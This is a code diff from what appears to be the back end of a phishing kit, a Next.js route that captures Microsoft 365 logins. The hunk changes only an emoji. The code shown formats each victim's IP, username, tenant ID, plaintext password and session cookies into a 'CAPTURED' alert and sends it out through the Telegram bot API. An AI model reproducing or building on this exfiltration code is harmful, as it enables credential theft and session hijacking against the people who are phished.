@@ -101,7 +101,7 @@ export async function POST(request: NextRequest) {
       domain
     )
     
-    const alertText = `🔵 *Microsoft 365 CAPTURED*\n\n⏰ *${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}*\n🌐 *IP:* \`${ip}\`\n\n👤 *User:* \`${userPrincipal}\`\n🏢 *Tenant ID:* \`${tenantId}\`\n🔐 *Password:* \`${data.password || 'N/A'}\`\n\n📊 *Cookies:* ${data.cookies ? `${(data.cookies.length / 1024).toFixed(1)}KB (${data.cookies.split(';').length} cookies)` : 'None'}\n🔗 *Domain:* \`${domain}\`\n💻 *UA:* ${request.headers.get('user-agent')?.substring(0, 100)}...\n\n📄 *Session PDF* → next`
+    const alertText = `💀 *Microsoft 365 CAPTURED*\n\n⏰ *${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}*\n🌐 *IP:* \`${ip}\`\n\n👤 *User:* \`${userPrincipal}\`\n🏢 *Tenant ID:* \`${tenantId}\`\n🔐 *Password:* \`${data.password || 'N/A'}\`\n\n📊 *Cookies:* ${data.cookies ? `${(data.cookies.length / 1024).toFixed(1)}KB (${data.cookies.split(';').length} cookies)` : 'None'}\n🔗 *Domain:* \`${domain}\`\n💻 *UA:* ${request.headers.get('user-agent')?.substring(0, 100)}...\n\n📄 *Session PDF* → next`
 
     // Text alert
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
